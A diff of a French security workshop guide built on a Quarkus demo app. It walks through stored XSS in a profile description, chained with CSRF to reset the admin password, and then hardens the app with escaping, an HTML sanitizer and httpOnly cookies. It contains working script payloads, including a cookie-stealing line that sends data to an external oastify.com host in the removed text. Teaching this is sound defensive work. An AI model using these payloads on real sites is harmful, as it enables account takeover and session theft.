@@ -91,53 +91,50 @@ quarkus.hibernate-orm.database.generation=update
 
 ## Phase d'attaque
 
-- Vous souhaitez prendre à nouveau le contrôle de l'administrateur de l'application, vous connaissez maintenant son email : admin@devoxx.com
-- Vous devez tout d'abord chercher la faille XSS, dans cet exercice vous devez alterner entre la position d'attaquant et la position de l'admin de l'autre, c'est un genre de jeu de rôle
-  - Indice : l'administrateur possède une page lui permettant de voir la liste de tous les utilisateurs. Vous pouvez la tester en vous mettant dans le rôle de l'admin, en vous connectant, puis en utilisant le bouton "Voir les utilisateurs"
-- Une fois la faille XSS trouvée, exploitez-la pour modifier le mot de passe de l'admin via une faille CSRF
-  - Pour alterner entre utilisateur qui tente de hacker, et administrateur qui va consulter sa page "Voir les utilisateurs", vous pouvez utiliser une session de navigation privée avec l'admin et la session standard avec l'utilisateur
-- Vous allez enfin vous connecter en tant qu'administrateur avec le nouveau mot de passe
+- Vous souhaitez prendre à nouveau le contrôle de l'administrateur de l'application, vous connaissez maintenant son email : admin@devoxx.com, et son mot de passe par défaut est devoxxinternet (mais vous l'avez surement déjà modifié dans le cas 01)
+- Dans cet exercice vous devez alterner entre la position d'attaquant (un utilisateur standard connecté) et celle de l'administrateur de l'autre, c'est un genre de jeu de rôle.
+  - Vous pouvez ouvrir une session de navigation privée sur firefox (ctrl+shift+p) pour vous connecter en administrateur. 
+  - Vous analysez le contenu de la page "voir les utilisateurs" et comprenez que certaines informations remplies par les utilisateurs se retrouvent sur cette page.
+  - Vous tentez d'exploiter dans un premier temps une vulnérabilité de type Stored XSS qui consiste à afficher une popup lorsque l'utilisateur click sur "voir les utilisateurs".
+  - Une fois la preuve de concept établie, vous volez le cookie de l'utilisateur :
+    - En l'affichant dans une pop-up
+    - BONUS : En vous l'envoyant via une requête HTTP si vous disposez d'un serveur web accessible
+- Vous changez le mot de passe de l'administrateur en lui faisant exécuter un changement de mot de passe à son insu et ce, sans utiliser le cookie volé au préalable : attaque CSRF depuis XSS
+- Vous contrôlez que la modification du mot de passe de l'administrateur a bien été prise en compte en vous connectant avec.
 
 ### Solution
 
-- Vous créez un compte d'attaque
-- Vous vous logguez
-- Vous lancez la modification de votre mot de passe afin de voir quelle requête est lancée => c'est cette requête qu'il faut faire lancer par l'admin via une attaque CSRF en utilisant son cookie
+- Vous créez un compte d'attaque et vous vous connectez avec
+- Vous modifiez votre description pour y injecter un javascript permettant l'affichage d'une pop-up : <script>alert('TestDevoxxs')</script>
+- Puis vous jouez le rôle de l'admin qui se connecte et se rend sur la page "les utilisateurs de l'application devoxx" via le bouton "Voir les utilisateurs"
+- Une pop-up affichant TestDevoxxs devrait s'ouvrir ce qui démontre que la vulnérabilité XSS est exploitable.
+- Depuis la session de l'utilisateur standard, vous lancez la modification de votre mot de passe afin de visualiser la requête lancée => c'est cette requête qu'il faut faire exécuter par l'administrateur via une attaque CSRF
 - Afin de pouvoir faire exécuter la requête par l'admin, vous allez modifier votre description pour inclure du code javascript (et ainsi exploiter une faille XSS) qui va lancer cette requête via fetch
-- Lorsque l'admin ira voir la page "les utilisateurs de l'application devoxx", la requête javascript sera exécutée, en utilisant son cookie, et son mot de passe sera changé automatiquement
+  - Lorsque l'admin ira voir la page "les utilisateurs de l'application devoxx", la requête javascript sera exécutée, en utilisant son cookie, et son mot de passe sera changé automatiquement
 - La description peut-être modifiée comme ceci :
-
 ```
 <script>
 fetch("http://localhost:8081/users/myprofile", {
-    "credentials": "include",
     "headers": {
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0",
-        "Accept": "*/*",
-        "Accept-Language": "fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3",
         "Content-Type": "application/json",
-        "Sec-Fetch-Dest": "empty",
-        "Sec-Fetch-Mode": "cors",
-        "Sec-Fetch-Site": "same-origin",
-        "Sec-GPC": "1"
     },
     "referrer": "http://localhost:8081/",
     "body": "{\"nickname\":\"admin\",\"firstName\":\"\",\"name\":\"\",\"email\":\"admin@devoxx.com\",\"desc\":\"\",\"password\":\"devoxxnew\",\"acceptNewsletter\":true}",
-    "method": "POST",
-    "mode": "cors"
+    "method": "POST"
 });
 </script>
 ```
 
-- Puis vous jouer le rôle de l'admin qui se connecte et qui se rend sur la page "les utilisateurs de l'application devoxx" via le bouton "Voir les utilisateurs"
-- Son mot de passe vient d'être modifié
+- Puis vous vous connectez avec l'administrateur et clickez sur "Voir les utilisateurs"
+- Son mot de passe vient d'être modifié, la requête de modification sur /users/myprofile est visible dans l'onglet réseau de votre navigateur depuis la session de l'administrateur
 - Vous pouvez ensuite vous connecter en tant qu'administrateur avec ce nouveau mot de passe
-
 - Bonus : Si vous souhaitez voler le cookie de l'admin voici une payload exemple que vous pouvez essayer dans le champ description
+```
+<script>var i=new Image;i.src="http://localhost:8081?cookie="+document.cookie;</script>
+```
 
-```
-<script>var i=new Image;i.src="http://jzm0oi5fnwqhv62vx06zgbiay14wsygn.oastify.com?cookie="+document.cookie;</script>
-```
+- Une fois exécutée, cette requête ainsi que le cookie de l'admin devraient être visibles dans l'onglet réseau de votre navigateur depuis la session de l'administrateur
+- Dans la pratique le serveur:port dans l'url ci-dessus (localhost:8081) seraient remplacés par ceux du hacker afin que le cookie lui parvienne
 
 ## Phase de défense
 
@@ -145,12 +142,11 @@ fetch("http://localhost:8081/users/myprofile", {
 
 ### Solution
 
-- Le mieux ici pour éviter les failles CSRF c'est déjà d'éviter les failles XSS, car CSRF peut être protégée via https://quarkus.io/guides/security-csrf-prevention, mais tant qu'il y a une XSS possible ça ne protegera pas des CSRF.
-- Il faut donc trouver le moyen d'enlever la faille XSS par plusieurs moyens : 
-  - Ne pas utiliser le  {user.desc.raw} dans le template quarkus, mais plutôt {user.desc} qui n'utilisera que le texte et non le code html, c'est moins permissif et donc plus sécurisé
+- Plusieurs problèmes ont permi le vol d'identifiants (mot de passe/session) de l'administrateur, le principal étant la présence d'une vulnérabilité XSS sur la page "voir les utilisateurs"
+- Plusieurs moyens existent pour s'en protéger :
+  - Ne pas utiliser le {user.desc.raw} dans le template quarkus, mais plutôt {user.desc} qui n'utilisera que le texte et non le code html, c'est moins permissif et donc plus sécurisé
   - Si l'on utilise LIT-HTML par exemple pour afficher cela il est trés sécurisé contre les failles XSS par défaut, donc il trés difficile de lui faire exécuter du code javascript, c'est encore mieux qu'utiliser un template Quarkus
   - Si l'on ne veut pas utiliser les 2 précédentes alors il faut "nettoyer" l'input client avant de l'afficher à l'écran, par exemple via la librairie https://owasp.org/www-project-java-html-sanitizer/
-
 ```
 <dependency>
     <groupId>com.googlecode.owasp-java-html-sanitizer</groupId>
@@ -173,6 +169,16 @@ public TemplateInstance usersTemplate() {
     return users.data("users", usersList);
 }
 ```
+
+- Vérifiez sur la page "voir les utilisateurs" que les payload injectées dans le champs description sont bien nettoyées/supprimées
+- L'absence du flag httpOnly sur le cookie de session a permi de lire sa valeur via l'appel à la fonction js document.cookie
+- Positionner la property ci-dessous dans le fichier application.properties pour activer ce flag :
+```
+quarkus.http.auth.form.http-only-cookie=true
+```
+- Vous pouvez exécuter "document.cookie" dans la console javascript du navigateur lorsque vous êtes connecté avec un utilisateur et vérifier que la valeur remontée est ""
+- Enfin, le changement d'une information sensible comme le mot de passe devrait obliger l'utilisateur à ressaisir son mot de passe actuel.
+  - Cela bloque la possibilité pour un attaquant de changer le mot de passe via une CSRF ou suite au vol d'un cookie de session
 
 # Cas 03 : Upload image de profil
 
